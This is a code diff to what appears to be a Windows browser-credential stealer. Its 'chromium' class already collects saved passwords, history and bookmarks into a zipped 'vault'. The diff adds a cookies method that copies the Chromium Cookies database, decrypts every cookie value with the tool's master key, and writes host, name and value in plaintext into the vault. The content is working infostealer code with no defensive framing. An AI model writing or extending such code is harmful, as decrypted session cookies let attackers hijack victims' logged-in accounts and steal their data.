@@ -374,6 +374,7 @@ class chromium():
                 '.\\' + name + '-passwords.txt',
                 '.\\' + name + '-web-history.txt',
                 '.\\' + name + '-search-history.txt',
+                '.\\' + name + '-cookies.txt',
                 '.\\' + name + '-bookmarks.txt',
             ]
 
@@ -386,6 +387,7 @@ class chromium():
                 self.web_history(name, path, profile)
                 self.search_history(name, path, profile)
                 self.bookmarks(name, path, profile)
+                self.cookies(name, path, profile)
 
             with ZipFile('.\\' + name + '-vault.zip', 'w') as zip:
                 for file in self.files:
@@ -498,6 +500,25 @@ class chromium():
                         f.write("URL: {}\n".format(item['url']))
 
         os.remove('bookmarks.json')
+
+    def cookies(self, name: str, path: str, profile: str) -> None:
+        path += '\\' + profile + '\\Network\\Cookies'
+        if not os.path.isfile(path):
+            return
+        vault = name.title() + '-Vault.db'
+        shutil.copy2(path, vault)
+        conn = sqlite3.connect(vault)
+        cursor = conn.cursor()
+        with open('.\\' + name + '-cookies.txt', 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall():
+                host_key, name, encrypted_value = res
+                value = self.decrypt_password(encrypted_value, self.masterkey)
+                if host_key != "" and name != "" and value != "":
+                    f.write("Host Site: {:<40} Name: {:<40} Value: {}\n".format(
+                        host_key, name, value))
+        cursor.close()
+        conn.close()
+        os.remove(vault)
 
 
 class system():
